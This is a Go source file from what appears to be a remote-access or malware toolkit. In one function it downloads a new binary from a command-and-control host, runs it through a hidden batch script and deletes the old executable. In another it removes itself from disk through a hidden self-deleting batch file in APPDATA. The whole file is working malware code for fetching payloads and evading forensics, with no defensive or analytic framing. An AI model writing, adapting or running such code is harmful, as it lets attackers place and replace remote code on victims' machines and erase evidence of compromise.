package roots

import (
	"log"
	"os"
	"os/exec"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/whiterabb17/gryphon"
)

func bury() {
	err := CreateFileAndWriteData(os.Getenv("APPDATA")+"\\remove.bat", []byte(`ping 1.1.1.1 -n 1 -w 4000 > Nul & Del "`+os.Args[0]+`" > Nul & del "%~f0"`))
	if err == nil {
		cmd := exec.Command("cmd", "/C", os.Getenv("APPDATA")+"\\remove.bat")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Start()
		time.Sleep(500)
		os.Exit(07)
	}
	time.Sleep(500)
	os.Exit(0)
}

func regrowth(url string, c2 string, wg *sync.WaitGroup) {
	var uUrl string
	if strings.Contains(url, "http") {
		uUrl = url
	} else {
		uUrl = "http://" + c2 + "/www/" + url
	}
	name, err := gryphon.Download(uUrl)
	if err != nil {
		log.Println(err)
	} else {
		log.Println(name)
		err := CreateFileAndWriteData(os.Getenv("APPDATA")+"\\remove.bat", []byte(`ping 1.1.1.1 -n 5 -w 4000 > Nul && del "`+os.Args[0]+`" > Nul && "`+name+`"`))
		if err == nil {
			cmd := exec.Command("cmd", "/C", os.Getenv("APPDATA")+"\\remove.bat")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			_ = cmd.Start()
			wg.Done()
			log.Println("Update Successful")
			time.Sleep(500)
			os.Exit(0)
		}
		time.Sleep(500)
		log.Println("Failed to update")
	}
}
